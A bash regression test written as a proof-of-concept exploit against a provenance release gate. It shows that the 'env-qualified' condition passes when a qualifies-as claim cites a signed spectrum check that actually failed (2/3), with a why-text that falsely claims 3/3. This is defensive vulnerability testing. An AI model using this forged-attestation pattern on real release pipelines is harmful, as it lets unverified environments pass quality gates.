#!/usr/bin/env bash
SD="$(cd "$(dirname "$0")" && pwd)"; . "$SD/_records.sh"
# REGRESSION TEST / EXPLOIT for the "env-qualified" release condition (release.rq lines 22-26).
#
# CLAIM UNDER TEST (README + 10-tool-spectrum): backing a qualifies-as with a re-derivable
# spectrum-check foton means the gate requires a real fulfilment, "not a bare 3/3 assertion".
#
# WHAT THIS SHOWS: the env-qualified branch checks only `?chk prov:used ?env` - that the fulfilment
# foton CONSUMED the env-spectrum. A spectrum check that FAILED (2/3) still consumed the spectrum, so
# it has the same prov:used edge. Result: a qualifies-as citing a fulfilment foton whose own recorded
# verdict says "2/3 ... NOT fulfilled" satisfies "env-qualified" identically to a genuine 3/3.
#
# Reuses the SHIPPED release.rq and release.py verbatim. Exits 0 iff the gate is FOOLED
# (env-qualified lights on a failed fulfilment) - i.e. exit 0 == vulnerability present.
set -euo pipefail
EXDIR="$(cd "$(dirname "$0")" && pwd)"
W="$(mktemp -d)"; trap 'rm -rf "$W"' EXIT
export PLANKTON_DIR="$W/plankton" NEKTON_DIR="$W/nekton"
mkdir -p "$PLANKTON_DIR" "$NEKTON_DIR"
cd "$W"
kg(){ plankton keygen "$1" >/dev/null; nekton keygen "$1" >/dev/null 2>&1 || true; }
plankton keygen author >/dev/null; nekton keygen qc >/dev/null

# --- a 3-member spectrum ------------------------------------------------------------------
for m in onecomp twocomp covariate; do printf 'ref-%s-correct\n' "$m" > "ref-$m.out"; done
HA=$(plankton hash ref-onecomp.out); HB=$(plankton hash ref-twocomp.out); HC=$(plankton hash ref-covariate.out)
plankton spectrum define --id exploit-suite --of "the tool under test" \
  --member "test-onecomp=$HA" --member "test-twocomp=$HB" --member "test-covariate=$HC" \
  -o spectrum.json >/dev/null
ENV=$(plankton hash spectrum.json)
echo "env-spectrum ENV = $ENV"

# --- a candidate environment that FAILS the spectrum: covariate mismatches (2/3) ----------
cp ref-onecomp.out cand-onecomp.out              # matches
cp ref-twocomp.out cand-twocomp.out              # matches
printf 'cand-covariate-WRONG\n' > cand-covariate.out   # does NOT match -> 2/3
CA=$(plankton hash cand-onecomp.out); CB=$(plankton hash cand-twocomp.out); CC=$(plankton hash cand-covariate.out)

echo; echo "--- the spectrum check GENUINELY FAILS (2/3) ---"
plankton spectrum check spectrum.json \
  --candidate "test-onecomp=$CA" --candidate "test-twocomp=$CB" --candidate "test-covariate=$CC" \
  > fulfilment.txt 2>&1 || true          # exits 1 on 2/3 - real run.sh guards this line the same way
sed 's/^/    /' fulfilment.txt

# --- back the qualification with that FAILING check, authored as a fulfilment foton -------
# (exactly the pattern run.sh line 85 uses - only the verdict differs: 2/3 instead of 3/3)
CHECK=$(plankton author --cmd "plankton spectrum check exploit-suite" \
  --in spectrum.json --in cand-onecomp.out --in cand-twocomp.out --in cand-covariate.out \
  --out fulfilment.txt --sign author.key --add | awk '/indexed foton/{print $3}')
echo "fulfilment foton (records a 2/3 FAILURE) = $CHECK"

# --- the FIT declares this env; qualifies-as cites the FAILING fulfilment foton -----------
printf 'the model fit\n' > fit.out
FIT=$(plankton author --cmd "Rscript fit.R" --in fit.out --out fit.out --environment "$ENV" \
  --sign author.key --add -o fit.dsse.json | awk '/indexed foton/{print $3}')
printf 'oci://ghcr.io/attacker/badenv:1.0@sha256:%064d\n' 0 > image.txt
OCI=$(plankton hash image.txt)
printf '{"subject":[{"hash":"%s","uri":"oci://ghcr.io/attacker/badenv:1.0"}],"predicate":"https://kton.dev/v/qualifies-as","object":{"id":"https://kton.dev/o/%s","fulfilment":"https://kton.dev/o/%s"},"why":"image fulfils exploit-suite (3/3)","by":"CN=qc","when":"2026-07-16T00:00:00Z"}' \
  "$OCI" "${ENV#sha256:}" "${CHECK#sha256:}" > qual.json
nekton claim qual.json qc.key --add >/dev/null
echo "qualifies-as claim authored: image -> ENV, fulfilment -> the 2/3 foton (why-text LIES '3/3')"

# --- export the merged graph and run the SHIPPED gate ------------------------------------
plankton export --rdf > submission.ttl 2>/dev/null
: > attestations.trig
nekton_record_files "$NEKTON_DIR" .recs | while IFS= read -r f; do nekton export --nanopub "$f" >> attestations.trig 2>/dev/null; echo >> attestations.trig; done

echo; echo "--- SHIPPED release.py over this graph (fit declares ENV; the cited fulfilment is 2/3) ---"
HEAD="sha256:$(printf 0 | plankton hash /dev/stdin 2>/dev/null | sed 's/sha256://' || echo 0)"
python3 "$EXDIR/release.py" submission.ttl attestations.trig "$EXDIR/release.rq" fit.dsse.json "$FIT" "$HEAD" 2>/dev/null | tee verdict.txt | sed 's/^/    /' || true

echo; echo "======================================================================"
if grep -q '\[x\].*environment is qualified' verdict.txt; then
  echo "VULNERABLE: 'env-qualified' is CHECKED though the cited fulfilment foton recorded 2/3 (NOT fulfilled)."
  echo "The gate never inspects the verdict tally - only that the foton prov:used the spectrum."
  echo "verdict foton actually says: $(tr -d '\n' < fulfilment.txt | grep -oE '[0-9]+/[0-9]+ member\(s\) fulfilled')"
  exit 0
else
  echo "NOT VULNERABLE: env-qualified did not light on a failed fulfilment (gate checks the tally)."
  exit 1
fi
